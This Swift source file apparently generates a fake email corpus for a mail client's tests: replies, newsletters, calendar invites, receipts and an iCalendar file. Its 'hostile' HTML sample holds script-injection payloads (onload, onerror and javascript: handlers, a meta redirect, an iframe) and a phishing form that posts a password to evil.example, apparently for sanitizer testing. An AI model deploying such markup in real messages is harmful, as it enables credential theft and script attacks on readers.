import Foundation
import MailModel
import OpenHumanCore

public enum FakeBodyKind: String, CaseIterable, Sendable {
    case plainReply, simpleHTML, newsletter, gmailReply, hostile, plainShort
    case calendarInvite
    case cidImage
    case receipt
}

struct FakeBodySpec: Sendable, Hashable {
    let kind: FakeBodyKind
    let sender: String
    let topic: String
    let other: String

    var content: MessageContent {
        MessageContent(html: FakeBodies.html(kind, from: sender, topic: topic, other: other),
                       text: FakeBodies.text(kind, from: sender, topic: topic, other: other))
    }

    var snippet: String { FakeCorpus.snippet(FakeBodies.text(kind, from: sender, topic: topic, other: other)) }
}

enum FakeBodies {
    static let inlineImageContentID = "chart-1@fake.example"

    static func content(_ kind: FakeBodyKind, from sender: String, topic: String, other: String) -> (html: String?, text: String) {
        (html(kind, from: sender, topic: topic, other: other), text(kind, from: sender, topic: topic, other: other))
    }

    static func text(_ kind: FakeBodyKind, from sender: String, topic: String, other: String) -> String {
        switch kind {
        case .plainReply:
            return """
            Hi,

            Thanks for sending this over. I read through the \(topic.lowercased()) notes and the numbers look right to me.
            Two small things: the totals on page 3 should round the same way as page 1, and the dates in the summary
            are a week off. Details at https://docs.example.com/\(topic.lowercased().replacingOccurrences(of: " ", with: "-")).

            On Mon, \(other) wrote:
            > Here is the latest draft. Let me know if anything stands out.
            > > Earlier: can we get this done before Friday?

            --\u{20}
            \(sender)
            Example Co.
            """
        case .plainShort:
            return "Works for me. See you then.\n\n-- \n\(sender)"
        case .simpleHTML:
            return "Hi, quick update on \(topic)."
        case .newsletter:
            return "\(topic): this week. Three short reads, one long one, and a chart we liked."
        case .gmailReply:
            return "Sounds good, let's keep \(topic.lowercased()) on the agenda for Thursday."
        case .hostile:
            return "Your account needs attention."
        case .calendarInvite:
            return """
            Invitation: \(topic) review

            When: Tuesday 10:00 – 10:30 (UTC)
            Where: Video call, https://meet.example/\(topic.count)-review
            Organizer: \(sender)
            Guests: \(other), you

            Agenda: walk through the open items on \(topic.lowercased()) and agree on next steps.

            Going? Yes - Maybe - No
            """
        case .cidImage:
            return "Here is the chart for \(topic.lowercased()) I mentioned. The dip in week 3 is the holiday."
        case .receipt:
            return "Thanks for your order. \(topic) starter kit $24.00, shipping $4.50, total $28.50."
        }
    }

    static func html(_ kind: FakeBodyKind, from sender: String, topic: String, other: String) -> String? {
        switch kind {
        case .plainReply, .plainShort:
            return nil
        case .simpleHTML:
            return """
            <div dir="ltr"><p>Hi,</p><p>Quick update on <b>\(topic)</b>: the first pass is done and the open questions
            are in <a href="https://wiki.example.org/\(topic.count)">the planning page</a>.</p>
            <ul><li>Review the outline</li><li>Agree on the dates</li><li>Send the summary to the team</li></ul>
            <p>Thanks,<br>\(sender)</p></div>
            """
        case .newsletter:
            return """
            <html><head><style>
              .wrap { background: #f2f4f7; padding: 24px 0; }
              .card { background: #ffffff; width: 560px; margin: 0 auto; border-radius: 8px; }
              .hero { background: url(https://images.news.example/hero.jpg) center / cover; height: 180px; }
              h1 { font: 600 24px/30px Georgia, serif; color: #1d2433; margin: 0 0 8px; }
              @media (max-width: 600px) { .card { width: 100% !important; } }
            </style></head><body>
            <div class="wrap"><table class="card" role="presentation" cellpadding="0" cellspacing="0" width="560">
              <tr><td class="hero"></td></tr>
              <tr><td style="padding: 24px 32px; font-family: Helvetica, Arial, sans-serif; color: #33415c;">
                <h1>\(topic): this week</h1>
                <p>Three short reads, one long one, and a chart we liked.</p>
                <img src="https://images.news.example/chart.png" width="496" height="220" alt="Weekly chart">
                <p><a href="https://news.example/read?id=\(topic.count)" style="color:#3056d3">Read the issue</a></p>
              </td></tr>
            </table></div>
            <img src="https://open.news.example/o.gif?u=fake" width="1" height="1" alt="">
            </body></html>
            """
        case .gmailReply:
            return """
            <div dir="ltr">Sounds good, let's keep \(topic.lowercased()) on the agenda for Thursday.</div><br>
            <div class="gmail_quote"><div dir="ltr" class="gmail_attr">On Tue, \(other) wrote:<br></div>
            <blockquote class="gmail_quote" style="margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex">
            <div dir="ltr">Can we move the \(topic.lowercased()) review to Thursday? Wednesday is packed.</div>
            </blockquote></div>
            """
        case .hostile:
            return """
            <html><head><meta http-equiv="refresh" content="0;url=https://evil.example/">
            <script>document.title = 'owned'</script>
            <style>@import url(https://evil.example/x.css); .banner { position: fixed; top: 0; }</style></head>
            <body onload="alert(1)">
            <p>Your account needs attention. <a href="javascript:alert(1)">Verify now</a>
            or <a href="https://example.com/help" target="_blank" onclick="steal()">read the help page</a>.</p>
            <form action="https://evil.example/collect"><input type="password" name="p"><button>Sign in</button></form>
            <iframe src="https://evil.example/frame"></iframe>
            <img src="x" onerror="alert(2)"><div class="banner">This text must not stick to the top.</div>
            </body></html>
            """
        case .calendarInvite:
            return """
            <div><p><b>Invitation: \(topic) review</b></p>
            <table role="presentation"><tr><td>When</td><td>Tuesday 10:00 – 10:30 (UTC)</td></tr>
            <tr><td>Where</td><td><a href="https://meet.example/\(topic.count)-review">Video call</a></td></tr>
            <tr><td>Organizer</td><td>\(sender)</td></tr><tr><td>Guests</td><td>\(other), you</td></tr></table>
            <p>Agenda: walk through the open items on \(topic.lowercased()) and agree on next steps.</p>
            <p>Going? <a href="https://calendar.example/rsvp?r=yes">Yes</a> · <a href="https://calendar.example/rsvp?r=maybe">Maybe</a>
            · <a href="https://calendar.example/rsvp?r=no">No</a></p></div>
            """
        case .cidImage:
            return """
            <div dir="ltr"><p>Here is the chart for \(topic.lowercased()) I mentioned:</p>
            <p><img src="cid:\(inlineImageContentID)" width="480" height="240" alt="Chart"></p>
            <p>The dip in week 3 is the holiday.</p><p>\(sender)</p></div>
            """
        case .receipt:
            return """
            <div><h2 style="font-family: Helvetica, Arial, sans-serif">Thanks for your order</h2>
            <table cellpadding="4" cellspacing="0" border="0" style="border-collapse: collapse">
            <tr><th align="left">Item</th><th align="right">Price</th></tr>
            <tr><td>\(topic) starter kit</td><td align="right">$24.00</td></tr>
            <tr><td>Shipping</td><td align="right">$4.50</td></tr>
            <tr><td><b>Total</b></td><td align="right"><b>$28.50</b></td></tr></table>
            <p>Order \(topic.count * 1_013). Questions? Reply to this email.</p></div>
            """
        }
    }

    static func calendarFile(topic: String, organizer: EmailAddress? = nil, attendee: EmailAddress? = nil) -> String {
        let host = organizer ?? EmailAddress(name: "Dana Ruiz", email: "dana@example.com")
        let me = attendee ?? EmailAddress(name: "Robin Example", email: "robin@example.com")
        let title = topic.hasPrefix("Invitation: ") ? String(topic.dropFirst("Invitation: ".count)) : "\(topic) review"
        return """
        BEGIN:VCALENDAR\r
        VERSION:2.0\r
        PRODID:-//OpenHuman//Fake corpus//EN\r
        METHOD:REQUEST\r
        BEGIN:VEVENT\r
        UID:fake-\(topic.count)@fake.example\r
        SEQUENCE:0\r
        DTSTART:20261013T100000Z\r
        DTEND:20261013T103000Z\r
        SUMMARY:\(title)\r
        LOCATION:Room 4\\, Example Building\r
        DESCRIPTION:Agenda: walk through the open items on \(title.lowercased()) and agree on next \r
         steps.\\n\\nBring the latest numbers.\r
        ORGANIZER;CN=\(host.name ?? host.email):mailto:\(host.email)\r
        ATTENDEE;CN=\(host.name ?? host.email);PARTSTAT=ACCEPTED;ROLE=REQ-PARTICIPANT:mailto:\(host.email)\r
        ATTENDEE;CN=\(me.name ?? me.email);PARTSTAT=NEEDS-ACTION;RSVP=TRUE:mailto:\(me.email)\r
        ATTENDEE;CN=Sam Lee;PARTSTAT=TENTATIVE:mailto:sam@example.org\r
        X-GOOGLE-CONFERENCE:https://meet.example/\(topic.count)-review\r
        END:VEVENT\r
        END:VCALENDAR\r

        """
    }
}
